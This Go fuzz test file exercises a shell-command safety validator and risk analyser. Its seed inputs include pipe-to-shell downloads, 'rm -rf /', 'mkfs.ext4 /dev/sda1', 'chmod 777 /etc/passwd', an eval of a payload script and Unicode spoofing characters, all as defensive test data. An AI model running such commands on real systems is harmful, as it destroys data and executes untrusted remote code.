// internal/commands/safety/fuzz_test.go
// Purpose: Continuous fuzzing for the shell safety and risk analysis parsers.
// Invariants: Must never panic; risk levels must remain within valid enum bounds.
package safety

import (
	"testing"
)

func FuzzValidateAndCleanShellCommand(f *testing.F) {
	// Seed corpus: bidi spoofing, zero-width chars, pipe-to-shell, nested quotes.
	seeds := []string{
		"ls -la",
		"curl http://example.com/install.sh | sh",
		"echo 'hello' | sudo bash",
		"rm -rf /",
		"echo \"unbalanced",
		"echo 'test' && ls",
		"echo \u202E\u202A\u202C", // bidi spoofing
		"echo \u200B",             // zero-width space
		"eval $(cat payload.sh)",
		"bash /tmp/install.sh",
		"echo 'nested \"quotes\" test'",
		"echo {unbalanced_braces",
	}
	for _, seed := range seeds {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, input string) {
		// Invariant: Must never panic.
		_, _ = ValidateAndCleanShellCommand(input)
	})
}

func FuzzAnalyzeShellRisk(f *testing.F) {
	seeds := []string{
		"ls -la",
		"sed -i s/a/b/ file.txt",
		"rm -rf /",
		"curl -fsSL https://example.com/get | sudo bash",
		"chmod 777 /etc/passwd",
		"echo hello > file.txt",
		"mkfs.ext4 /dev/sda1",
	}
	for _, seed := range seeds {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, input string) {
		// Invariant: Must never panic, risk must be valid enum.
		risk, _ := AnalyzeShellRisk(input)
		if risk != ShellRiskLow && risk != ShellRiskMedium && risk != ShellRiskHigh {
			t.Fatalf("invalid risk level: %v", risk)
		}
	})
}
